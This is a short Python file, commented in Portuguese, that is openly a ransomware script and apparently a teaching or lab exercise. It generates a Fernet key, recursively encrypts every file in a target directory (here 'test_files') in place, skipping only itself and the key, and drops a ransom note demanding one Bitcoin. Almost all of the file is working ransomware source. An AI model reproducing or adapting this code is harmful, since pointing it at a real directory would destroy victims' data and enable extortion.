from encodings import utf_8
import os
from cryptography.fernet import Fernet

#Primeira Etapa: Gerar e salvar uma chave de criptografia:
def gera_chave():
    chave = Fernet.generate_key()
    with open('chave.key', 'wb') as key_file:
        key_file.write(chave)


#Segunda etapa: Carregar a chave salva:
def carrega_chave():
    with open('chave.key', 'rb') as key_file:
        chave = key_file.read()
    return chave


#Terceira etapa: Criptografar um arquivo:
def criptografa_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, 'rb') as old_file:
        dados_encriptados = f.encrypt(old_file.read())
    with open(arquivo, 'wb') as new_file:
        new_file.write(dados_encriptados)


# Quarta Etapa: Listar todos os arquivos de um diretório:
def listar_arquivos(diretorio):
    lista = [os.path.join(raiz, arquivo)
             for raiz, _, arquivos in os.walk(diretorio)
             for arquivo in arquivos
             if (arquivo != 'ransomware.py') and (not arquivo.endswith('.key'))]
    return lista
        
#Quinta Etapa: Criptografar todos os arquivos de um diretório e subdiretórios:
def criptografa_tudo(diretorio, chave):
    for arquivo in listar_arquivos(diretorio):
        criptografa_arquivo(arquivo, chave)


#Sexta Etapa: Criar mensagem de resgate:
def cria_mensagem_resgate():
    with open('LEIA_ISTO.txt', 'w', encoding='utf8') as msg_file:
        msg_file.write('Olá, tudo bem?\nAcho que não, né?\nSeus arquivos estão criptografados.\n\
Para recuperá-los, é bem simples. Basta enviar 1 BitCoin para o endereço X e enviar o comprovante.\n\
Depois disso, enviaremos a chave para descriptografar os arquivos e sua vida poderá seguir em paz.\n\
Tenha um dia satisfatoriamente bom :)')

#Sétima Etapa: Execução do ransomware:
if __name__ == '__main__':
    diretorio = 'test_files'
    with open('estado.txt', 'r') as status_file:
        status = status_file.read()
    if status == 'descriptografado':
        gera_chave()
        criptografa_tudo(diretorio, carrega_chave())
        cria_mensagem_resgate()
        with open('estado.txt', 'w') as status_file:
            status_file.write('criptografado')
    print('Os arquivos estão criptografados')

